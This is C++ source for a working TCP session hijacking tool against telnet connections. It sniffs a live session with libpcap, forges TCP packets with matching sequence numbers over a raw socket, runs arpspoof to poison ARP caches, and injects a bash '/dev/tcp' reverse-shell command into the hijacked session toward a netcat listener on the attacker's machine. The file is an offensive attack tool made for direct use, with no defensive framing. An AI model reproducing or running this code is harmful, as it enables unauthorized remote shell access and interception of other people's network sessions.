#include <bits/stdc++.h> 
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <utility>


using namespace std;


pair<u_long, u_long> sniffPacket(u_long clientIP, u_long clientPort, u_long serverIP, u_long serverPort, char* iface)
{
	//preparing the sniffer
	int headerLength = 14;                // link-layer header length (Ethernet)
	pcap_t *handle;                      // session handle 
	char* interface;                    // interface to sniff on
	char errbuf[PCAP_ERRBUF_SIZE];     // error string 
	struct bpf_program fp;            // the compiled filter expression
	char filter_exp[] = "port 23";   // the filter expression (Look for only telnet traffic) 
	bpf_u_int32 mask;               // the netmask of the sniffing device 
	bpf_u_int32 net;               // the IP of the sniffing device 
 

	// finding the default device to be used for sniffing
	interface = pcap_lookupdev(errbuf);
	if (interface == NULL)
	{
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		exit(-1);
	}

	//storing the interface name for future use
	strncpy(iface, interface, strlen(interface));

	if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1)
	{
		 fprintf(stderr, "Can't get netmask for device %s\n", interface);
		 net = 0;
		 mask = 0;
	}

 	handle = pcap_open_live(interface,
		BUFSIZ,// portion of the packet to capture
		1,    // promiscuous mode
		-1,  // timeout value(infinite)
		errbuf);
		
	if (handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
		exit(-1);
	}
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) 
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(-1);
	}
	if (pcap_setfilter(handle, &fp) == -1) 
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(-1);
	}

	//checking if the sniffing interface provide ethernet headers
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "Interface %s doesn't provide Ethernet headers - not supported\n", interface);
		exit(-1);
	}

	printf("Waiting for traffic in the connection...\n");

	struct ip      ipHeader;
	struct tcphdr   tcpHeader;
	u_char* packet;

	
	//sniffing packets
	while(1) 
	{
		struct pcap_pkthdr packetHeader;
		packet = (u_char *) pcap_next(handle, &packetHeader);
		if (!packet)
			continue;

		memcpy(&ipHeader, packet + headerLength, sizeof(ipHeader));
		// checking if source and destination IP's match
		if ((ipHeader.ip_src.s_addr != clientIP) || (ipHeader.ip_dst.s_addr != serverIP))
			continue;
		memcpy(&tcpHeader, packet + headerLength + sizeof(ipHeader), sizeof(tcpHeader));
		// checking if source and destination port no's match
		if ((tcpHeader.th_sport != htons(clientPort)) || (tcpHeader.th_dport != htons(serverPort)))
			continue;
		//checking if the packet is part of an ongoing session 
		if (!(tcpHeader.th_flags & TH_ACK))
			continue;
		printf("Sniffed packet! SEQ = %u ACK = %u\n", htonl(tcpHeader.th_seq), htonl(tcpHeader.th_ack));
		
		pair<u_long, u_long> packetInfo ;

		packetInfo.first = htonl(tcpHeader.th_seq);
		packetInfo.second = htonl(tcpHeader.th_ack);

		pcap_close(handle);
		return packetInfo;
	}	
}



int calculateChecksum(u_short *addr, int len)
{
	int sum;
	int nleft;
	u_short ans;
	u_short *w;

	sum = 0;
	ans = 0;
	nleft = len;
	w = addr;
	// taking 16 bit chunks at a time
	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}
	// if the data is not a multiple of 16 bit chunks
	if (nleft == 1)
	{
		*(u_char *)(&ans) = *(u_char *)w;
		sum += ans;
	}
	return (sum);
}

void sendPacket(u_long clientIP, u_long clientPort, u_long serverIP, u_long serverPort, u_long flags, u_long seq, u_long ack, char *data, int length)
{
	//variables for sockopt
	int one = 1;
	int* oneptr = &one; 

	struct ip       ipHeader;
	struct tcphdr   tcpHeader;
	int fd;                     // raw Socket descriptor
	int ipHeaderLength = 20;   // in bytes
	int tcpHeaderLength = 20; // in bytes

	srandom(time(NULL));    //random number seed for ip packet identification no. field
	u_char* packet;
	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (fd == -1)
	{
		printf("Couldn't open raw socket\n");
		exit(-1);
	}
	// specifying that we'll be including headers and broadcasting them
	if ((setsockopt(fd, IPPROTO_IP, IP_HDRINCL, oneptr, sizeof(one)) == -1) || (setsockopt(fd, SOL_SOCKET, SO_BROADCAST, oneptr, sizeof(one)) == -1) )
	{
		printf("Sockopt error\n");
		exit(-1);
	}
   
	packet = (u_char*) malloc(ipHeaderLength + tcpHeaderLength + length);
	//constructing ip header
	ipHeader.ip_v    = 4;                                                       // version 4 
	ipHeader.ip_hl   = 5;                                                      // 20 byte header i.e 5 words 
	ipHeader.ip_tos  = IPTOS_LOWDELAY;                                        // IP tos 
	ipHeader.ip_len  = htons(ipHeaderLength + tcpHeaderLength + length);     // total length 
	ipHeader.ip_id   = htons(random());                                     // IP ID 
	ipHeader.ip_off  = htons(0);                                           // fragmentation flags 
	ipHeader.ip_ttl  = 255;                                               // time to live 
	ipHeader.ip_p    = IPPROTO_TCP;                                      // transport protocol 
	ipHeader.ip_sum  = 0;                                               // ip header checksum calculated by kernel
	ipHeader.ip_src.s_addr = clientIP;
	ipHeader.ip_dst.s_addr = serverIP;
	memcpy(packet, (u_char *)&ipHeader, sizeof(ipHeader));
	//constructing tcp header
	tcpHeader.th_sport   = htons((u_short)clientPort);   // source port 
	tcpHeader.th_dport   = htons((u_short)serverPort);  // destination port
	tcpHeader.th_seq     = htonl(seq);                 // sequence number 
	tcpHeader.th_ack     = htonl(ack);                // acknowledgement number 
	tcpHeader.th_flags   = flags;                    // control flags 
	tcpHeader.th_x2      = 0;                       // UNUSED 
	tcpHeader.th_off     = 5;                      // 20 byte header i.e. 5 words
	tcpHeader.th_win     = htons(65535);          // max window size 
	tcpHeader.th_sum     = 0;                    // calculated actual value later
	tcpHeader.th_urp     = 0;                   // urgent pointer 
	//copying data
	memcpy(packet + ipHeaderLength + tcpHeaderLength, (u_char*)data, length);
	memcpy(packet + ipHeaderLength, (u_char*)&tcpHeader, sizeof(tcpHeader));

	int sum = 0;
	struct ip* ipPointer = (struct ip*)packet;
	struct tcphdr* tcpPointer = (struct tcphdr *)(packet+ipHeaderLength);

	tcpPointer->th_sum = 0;

	// calculating the checksum for the pseudoheader
	sum = calculateChecksum((u_short *)&ipPointer->ip_src, 8);
	sum += ntohs(IPPROTO_TCP + tcpHeaderLength + length);

	// calculating the checksum for the tcp segment
	sum += calculateChecksum((u_short *)tcpPointer, tcpHeaderLength + length);

	//adding the carry
	sum = (sum >> 16) + (sum & 0xffff);
	sum = (~(sum + (sum >> 16)) & 0xffff);
	
	tcpPointer->th_sum = sum;

	//writing the data to socket
	struct sockaddr_in sin;
	memset(&sin, 0, sizeof(struct sockaddr_in));
	sin.sin_family  = AF_INET;
	sin.sin_addr.s_addr = serverIP; //receiver ip

	sendto(fd, packet, ipHeaderLength + tcpHeaderLength + length, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr));
   	close(fd);
	free(packet);

}



int main(int argc, char** argv)
{
	// sudo ./a.out 192.168.43.199 49734 192.168.43.191 23
	if(argc != 5)
	{
		printf("Usage: %s <client ip> <client port> <server ip> <server port>\n", argv[0]);
		printf("Note: Default network interface will be used for hijacking.\n");
		exit(-1);
	}
	int userID = geteuid();
	if (userID != 0)
	{
		printf("Root access required. Exiting...\n");
		exit(-1);
	}
	char buf[8192];


	
	u_long clientIP = inet_addr(argv[1]);
	u_long clientPort = atol(argv[2]);
	u_long serverIP = inet_addr(argv[3]);
	u_long serverPort = atol(argv[4]);

	printf("Setting up for switched environments...\n");
	system("sudo sysctl net.ipv4.ip_forward=1");


	char interface[20];
	pair<u_long, u_long> packetInfo = sniffPacket(clientIP, clientPort, serverIP, serverPort, interface);

	// opening a new terminal window for the reverse shell
	system("gnome-terminal -x bash -c 'echo \"Waiting for reverse shell to connect..\" ; nc -lv 9090 ;  exec bash'");

	memset(&buf, 0, sizeof(buf));

	// sending a big packet immediately so that original sender cant get this connection out of sync
	sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, buf, 1024);
	packetInfo.first += 1024;

	// getting the ip address of the sniffing interface
	string ip;
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
	close(fd);

	//launching arpspoof attack for switched environments
	printf("Sending arp cache poisioning packets....\n");
	string arpCommand = string("xterm -e bash -c '") + string("sudo arpspoof -i ") + string(interface)+ string(" -t ") + argv[3]
					   + string(" ") + argv[1] + string(" -r ; exec bash' &") ;
	system(arpCommand.c_str());

	sleep(5);

	// sending reverse shell command to serverPC
	string bashCommand = "\r /bin/bash -i > /dev/tcp/" + ip + "/9090 2>&1 0<&1 \r";
	int n = bashCommand.size() + 1 ;
	char str[n];
	strncpy(str, bashCommand.c_str(), n);
	sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, str, strlen(str));
	packetInfo.first += strlen(str);

	printf("Hijacking started.\n");
	printf("The new terminal gives you access to the targetPC using new connection\n");
	printf("Type exit here to close the hijacked connection\n>");

	
	while (fgets(buf, sizeof(buf) - 1, stdin)) {
		// in case we want to send data using the hijacked connection
		// sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, buf, strlen(buf));
		// packetInfo.first += strlen(buf);
		// memset(&buf, 0, sizeof(buf));
		if(!strcmp(buf, "exit"))
		{
			printf("Closing the hijacked connection\n");
			sendPacket(clientIP, clientPort, serverIP, serverPort, TH_ACK | TH_PUSH, packetInfo.first, packetInfo.second, str, strlen(str));
			exit(0);
		}
		printf(">");
		
	}	
	
	
	return 0;
}